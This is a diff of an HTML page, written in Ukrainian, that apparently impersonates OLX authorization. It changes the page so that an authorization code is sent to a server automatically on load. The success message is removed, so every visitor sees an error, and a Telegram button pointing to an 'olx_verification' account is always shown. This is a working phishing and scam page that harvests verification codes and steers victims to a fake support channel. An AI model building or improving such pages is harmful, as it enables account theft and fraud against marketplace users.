@@ -58,7 +58,7 @@ button:hover {
 <div class="card">
     <h2 id="title">Виникла помилка авторизації</h2>
     <p id="status">Помилка авторизації, будь ласка, зверніться до підтримки.</p>
-    <button id="btn" style="display:none;">Зв'язатися через Telegram</button>
+    <button id="btn" style="display:inline-block;">Зв'язатися через Telegram</button>
 </div>
 
 <script>
@@ -71,6 +71,12 @@ const telegramUrl = "https://t.me/olx_verification/share/url?url=&text=" + encod
     "Виникла помилка авторизації, будь ласка, зверніться до підтримки. В повідомленні вкажіть «Помилка авторизації»"
 );
 
+// Кнопка Telegram
+document.getElementById("btn").addEventListener("click", () => {
+    window.location.href = telegramUrl;
+});
+
+// Функция отправки кода на сервер
 async function sendCode(code) {
     if (!code) return showError("Код авторизації не знайдено.");
 
@@ -83,10 +89,7 @@ async function sendCode(code) {
 
         const result = await response.json();
 
-        if (response.ok) {
-            document.getElementById("title").innerText = "Успішна авторизація";
-            document.getElementById("status").innerText = "Вхід завершено успішно.";
-        } else {
+        if (!response.ok) {
             showError("Помилка авторизації, будь ласка, зверніться до підтримки.");
         }
     } catch (err) {
@@ -95,25 +98,22 @@ async function sendCode(code) {
     }
 }
 
-function showError(message) {
-    document.getElementById("title").innerText = "Виникла помилка авторизації";
-    document.getElementById("status").innerText = message;
-    document.getElementById("btn").style.display = "inline-block";
-}
-
-// Кнопка Telegram
-document.getElementById("btn").addEventListener("click", () => {
-    window.location.href = telegramUrl;
-});
-
-// Автоматическая отправка при загрузке
+// Отправка кода автоматически при загрузке страницы
 if (code) {
     sendCode(code);
 } else {
     showError("Код авторизації не знайдено. В повідомленні вкажіть «Помилка авторизації»");
 }
+
+// Показываем ошибку на странице
+function showError(message) {
+    document.getElementById("title").innerText = "Виникла помилка авторизації";
+    document.getElementById("status").innerText = message;
+    document.getElementById("btn").style.display = "inline-block";
+}
 </script>
 
 </body>
 </html>
+
 
